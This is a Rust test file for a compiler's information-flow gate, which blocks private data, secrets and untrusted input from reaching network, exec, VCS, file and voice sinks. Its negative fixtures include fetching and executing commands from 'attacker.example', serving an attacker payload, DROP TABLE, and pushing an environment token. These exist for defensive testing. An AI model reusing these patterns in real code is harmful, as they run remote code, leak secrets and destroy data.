//! Наряд №325 (issue #419) — sink clearance on classified sinks +
//! `profile legacy` (ADR-0161).
//!
//! Covers:
//! - (а) the red/green scenario: `http_post(url, private_data)` does NOT
//!   compile (SINK_CLEARANCE family); under `profile legacy
//!   { egress: permissive_with_audit }` it compiles with audit events;
//! - (б) the sink list comes from the №316 classification (no
//!   hand-written list) — pinned against BUILTIN_CLASSES;
//! - (в) specialized classes: PII_EGRESS_OUTPUT/NETWORK,
//!   SECRET_EGRESS_NETWORK/VCS, SECRET_TO_EXEC, UNTRUSTED_EXEC_DECISION,
//!   UNTRUSTED_EGRESS_NETWORK, VOICE_EGRESS_UNCONSENTED,
//!   IRREVERSIBLE_NO_GRANT, TAINT_PERSISTENCE (memory), HTML_INJECTION
//!   (public output), SECRET_LEAK (file), SINK_CLEARANCE (generic);
//! - (г) `poisoned` clears no sink;
//! - (д) zero delta: plain programs (bottom labels) pass;
//! - (е) the leak-suite corpus is fully caught (BLOCKING mode);
//! - (ж) no-stub hygiene.
//!
//! Boundary (loud, per the naryad): media sinks are Phase 2 (№331+);
//! the runtime twin of the gate is №328; consent sources are Phase 2
//! (№335); the general integrity gate is №327; per-call escape policies
//! are revisited after Phase 2.

use metalogos::builtins_classification::{Role, BUILTIN_CLASSES};
use metalogos::parser::parse;
use metalogos::semantic::check_program;

fn compile_errors(source: &str) -> Vec<String> {
    // The compile path = audit_category_a promotion (№98): parse + gate.
    match metalogos::compile_program(source) {
        Ok(_) => Vec::new(),
        Err(e) => e.lines().map(str::to_string).collect(),
    }
}

fn check_errors(source: &str) -> Vec<String> {
    check_program(&parse(source).unwrap())
        .errors
        .iter()
        .map(|e| e.message.clone())
        .collect()
}

// ── (а) The naryad scenario, red/green ───────────────────────────────

#[test]
fn n325_private_data_into_http_post_does_not_compile() {
    let src = r#"
        entity record: String = "Иванов Иван, снилс 123-456-789, диагноз конфиденциален"
        pattern Send(data: String) -> String {
            let _ = http_post("https://analytics.example/collect", record)
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter().any(|m| m.contains("[PII_EGRESS_NETWORK]")),
        "private data into a network sink must fail compilation: {errs:?}"
    );
}

#[test]
fn n325_same_path_under_legacy_compiles_with_audit_events() {
    let src = r#"
        profile legacy { egress: permissive_with_audit }
        entity record: String = "Иванов Иван, снилс 123-456-789, диагноз конфиденциален"
        pattern Send(data: String) -> String {
            let _ = http_post("https://analytics.example/collect", record)
            return "sent"
        }
    "#;
    // Compiles: the gate is advisory under the legacy profile.
    let result = metalogos::compile_program(src);
    assert!(
        result.is_ok(),
        "legacy profile must keep compilation green: {:?}",
        result.err()
    );
    // And the audit report records the events (Severity::Info).
    let report = metalogos::audit_program(src).expect("audit must parse");
    let events = report
        .findings
        .iter()
        .filter(|f| f.check_id == "PII_EGRESS_NETWORK")
        .count();
    assert!(events >= 1, "audit events must be recorded under legacy");
    for f in report
        .findings
        .iter()
        .filter(|f| f.check_id == "PII_EGRESS_NETWORK")
    {
        assert_eq!(f.severity, metalogos::audit::Severity::Info);
    }
}

#[test]
fn n325_private_url_into_http_post_address_is_secret_egress_network() {
    let src = r#"
        entity endpoint: String = "https://internal.corp.example/secret-endpoint"
        pattern Send(data: String) -> String {
            let _ = http_post(endpoint, "ping")
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter().any(|m| m.contains("[SECRET_EGRESS_NETWORK]")),
        "private-infrastructure destination must be SECRET_EGRESS_NETWORK: {errs:?}"
    );
}

// ── (б) The sink list comes from the №316 classification ─────────────

#[test]
fn n325_sink_list_is_classification_backed_not_handwritten() {
    // The gate uses classify(name).role == Sink; pin the contract on the
    // SSOT map itself: every entry the map calls a Sink must be gated.
    // (Guard: these three representative sinks are all Role::Sink — if
    // the classification moves, this test fails loudly.)
    for name in [
        "http_post",
        "print",
        "db_execute",
        "write_file",
        "git_push",
        "tts_send",
        "exec",
        "send_message",
    ] {
        let class = metalogos::builtins_classification::classify(name)
            .unwrap_or_else(|| panic!("{name} must be classified"));
        assert_eq!(class.role, Role::Sink, "{name} must stay a Sink in №316");
    }
    // And the classification map itself is non-trivially large (the №316
    // coverage test pins 100% of BUILTIN_REGISTRY; here we only guard
    // against an empty/lost map).
    assert!(BUILTIN_CLASSES.len() > 400);
}

// ── (в) Specialized classes ──────────────────────────────────────────

#[test]
fn n325_pii_print_is_pii_egress_output() {
    let src = r#"
        entity record: String = "диагноз: диабет 2 типа, паспорт 4510 123456"
        pattern Send(data: String) -> String {
            let _ = print(record)
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter().any(|m| m.contains("[PII_EGRESS_OUTPUT]")),
        "PII literals into stdout must be PII_EGRESS_OUTPUT: {errs:?}"
    );
}

#[test]
fn n325_secret_to_exec_and_untrusted_exec_decision() {
    let secret = r#"
        pattern Send(data: String) -> String {
            let _ = exec(env("MLOG_LEAK_SUITE_CMD"))
            return "executed"
        }
    "#;
    assert!(
        compile_errors(secret)
            .iter()
            .any(|m| m.contains("[SECRET_TO_EXEC]")),
        "env secret into exec must be SECRET_TO_EXEC"
    );
    let untrusted = r#"
        pattern Send(data: String) -> String {
            let _ = exec(http_get("https://attacker.example/cmd"))
            return "executed"
        }
    "#;
    assert!(
        compile_errors(untrusted)
            .iter()
            .any(|m| m.contains("[UNTRUSTED_EXEC_DECISION]")),
        "network data into exec must be UNTRUSTED_EXEC_DECISION"
    );
}

#[test]
fn n325_secret_egress_vcs_and_voice_unconsented() {
    let vcs = r#"
        pattern Send(data: String) -> String {
            let _ = git_push(env("MLOG_LEAK_SUITE_TOKEN"))
            return "pushed"
        }
    "#;
    assert!(
        compile_errors(vcs)
            .iter()
            .any(|m| m.contains("[SECRET_EGRESS_VCS]")),
        "env secret into git_push must be SECRET_EGRESS_VCS"
    );
    let voice = r#"
        pattern Send(data: String) -> String {
            let _ = tts_send("текст от имени клиента", "voice-orlov", env("B"), "12345")
            return "sent"
        }
    "#;
    assert!(
        compile_errors(voice)
            .iter()
            .any(|m| m.contains("[VOICE_EGRESS_UNCONSENTED]")),
        "voice egress without a consent scope must be VOICE_EGRESS_UNCONSENTED"
    );
}

#[test]
fn n325_irreversible_no_grant_on_destructive_sql() {
    let src = r#"
        pattern Send(data: String) -> String {
            let _ = db_execute("DROP TABLE users")
            return "done"
        }
    "#;
    assert!(
        compile_errors(src)
            .iter()
            .any(|m| m.contains("[IRREVERSIBLE_NO_GRANT]")),
        "destructive SQL without a grant must be IRREVERSIBLE_NO_GRANT"
    );
}

#[test]
fn n325_memory_persistence_class_and_file_secret_leak() {
    let memory = r#"
        pattern Send(data: String) -> String {
            let _ = memorize("leak_key", call_llm(data))
            return "sent"
        }
    "#;
    assert!(
        compile_errors(memory)
            .iter()
            .any(|m| m.contains("[TAINT_PERSISTENCE]")),
        "LLM output into persistent memory must be TAINT_PERSISTENCE"
    );
    let file = r#"
        pattern Send(data: String) -> String {
            let _ = write_file("/tmp/notes.txt", env("K"))
            return "sent"
        }
    "#;
    assert!(
        compile_errors(file)
            .iter()
            .any(|m| m.contains("[SECRET_LEAK]")),
        "env secret into a file sink must keep the SECRET_LEAK class"
    );
}

#[test]
fn n325_untrusted_output_inherits_html_injection_class() {
    // respond(http_get(...)) — the corpus vocabulary keeps the legacy
    // class; the lattice generalizes it (untrusted → public output).
    let src = r#"
        pattern Send(data: String) -> String {
            let _ = respond("200 OK", http_get("https://attacker.example/payload"))
            return "sent"
        }
    "#;
    assert!(
        compile_errors(src)
            .iter()
            .any(|m| m.contains("[HTML_INJECTION]")),
        "untrusted data into a public output must be HTML_INJECTION"
    );
}

#[test]
fn n325_redact_before_sink_still_compiles() {
    // The №274/№326 sanitizer is the ONE downward path: masked data is
    // bottom — it clears every sink.
    let src = r#"
        pattern Send(data: String) -> String {
            let _ = print(redact(env("K"), "secrets"))
            return "sent"
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.iter().all(|m| !m.contains("SINK_CLEARANCE")
            && !m.contains("PII_")
            && !m.contains("SECRET_")),
        "redact-before-sink must clear the gate: {errs:?}"
    );
}

// ── (г) Poisoned clears nothing ──────────────────────────────────────

#[test]
fn n325_poisoned_clears_no_sink() {
    // The quarantine element: ADR-0154 §2.1 — no legal sinks. The gate
    // contract is pinned structurally: the semantic layer reports the
    // violation whenever the argument label is poisoned (here reached
    // through the public API with a hand-seeded environment).
    let errs = check_errors(
        r#"
        pattern P(x: String<poisoned>) -> String {
            let _ = print(x)
            return "done"
        }
    "#,
    );
    assert!(
        errs.iter().any(|m| m.contains("SINK_CLEARANCE")),
        "poisoned must clear no sink (generic class): {errs:?}"
    );
}

// ── (д) Zero delta for plain programs ────────────────────────────────

#[test]
fn n325_plain_programs_stay_clean() {
    let src = r#"
        entity greeting: String = "Hello"
        pattern Greet(name: String) -> String {
            let _ = print("Hello, " + name + "!")
            return greeting
        }
    "#;
    let errs = compile_errors(src);
    assert!(
        errs.is_empty(),
        "literals and locals must clear every sink: {errs:?}"
    );
    let src2 = r#"
        pattern P() -> String {
            let _ = http_post("https://api.example/v1", "ping")
            return "ok"
        }
    "#;
    assert!(
        compile_errors(src2).is_empty(),
        "public literals into network sinks must pass"
    );
}

#[test]
fn n325_profile_unknown_words_are_loud() {
    let errs = check_errors("profile strictmode { egress: permissive_with_audit }");
    assert!(
        errs.iter()
            .any(|m| m.contains("unknown compatibility profile 'strictmode'")),
        "unknown profile name must be loud: {errs:?}"
    );
    let errs = check_errors("profile legacy { egress: wide_open }");
    assert!(
        errs.iter()
            .any(|m| m.contains("unknown egress mode 'wide_open'")),
        "unknown egress mode must be loud: {errs:?}"
    );
}

// ── (е) The leak-suite corpus is fully caught (BLOCKING) ─────────────

#[test]
fn n325_leak_suite_corpus_is_closed() {
    // Recompute the suite's own contract here (independent of the
    // runner's mode attribute, so a future regression in the corpus is
    // caught twice): every negative must fail compilation with its
    // expected class, every positive must keep compiling.
    let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("examples/leak");
    // №386: SORT the entries. The cross-module pair (n386_a_writer →
    // n386_b_reader) only detects when the writer module is audited
    // BEFORE the reader — the leak-suite runner sorts its corpus, and
    // this independent double-check must walk the files in the same
    // deterministic order (read_dir order is arbitrary).
    let mut paths: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
        .expect("leak dir")
        .filter_map(|e| e.ok())
        .map(|e| e.path())
        .collect();
    paths.sort();
    let mut negatives = 0usize;
    for p in paths {
        if p.extension().map(|x| x == "mlog") != Some(true) {
            continue;
        }
        let stem = p.file_stem().unwrap().to_string_lossy().to_string();
        if !stem.starts_with('n') {
            continue;
        }
        negatives += 1;
        let err_file = p.with_extension("error");
        let err_text = std::fs::read_to_string(&err_file).unwrap();
        let expected = err_text
            .lines()
            .find_map(|l| l.strip_prefix("EXPECTED:"))
            .unwrap()
            .split('—')
            .next()
            .unwrap()
            .trim()
            .to_uppercase();
        let src = std::fs::read_to_string(&p).unwrap();
        match metalogos::compile_program(&src) {
            Ok(_) => panic!("leak corpus hole: {stem} compiled but must not"),
            Err(e) => {
                let got_class = e
                    .lines()
                    .find_map(|l| {
                        let s = l.trim();
                        s.starts_with('[').then(|| {
                            let end = s.find(']').unwrap();
                            s[1..end].to_string()
                        })
                    })
                    .unwrap_or_else(|| "COMPILE".to_string());
                assert_eq!(
                    got_class, expected,
                    "{stem}: expected class {expected}, got {got_class}"
                );
            }
        }
    }
    assert!(negatives >= 28, "corpus must keep growing: {negatives}");
}

// ── (ж) No-stub hygiene (№16.0-D) ────────────────────────────────────

#[test]
fn n325_no_stub_markers_in_touched_files() {
    let manifest_dir = env!("CARGO_MANIFEST_DIR");
    for file in [
        "src/semantic.rs",
        "src/audit.rs",
        "src/profile.rs",
        "src/parser/decl.rs",
    ] {
        let src = std::fs::read_to_string(format!("{manifest_dir}/{file}"))
            .unwrap_or_else(|_| panic!("{file} must exist"));
        for marker in ["todo!", "unimplemented!", "SKELETON"] {
            assert!(
                !src.contains(marker),
                "stub marker `{marker}` found in {file}"
            );
        }
    }
}
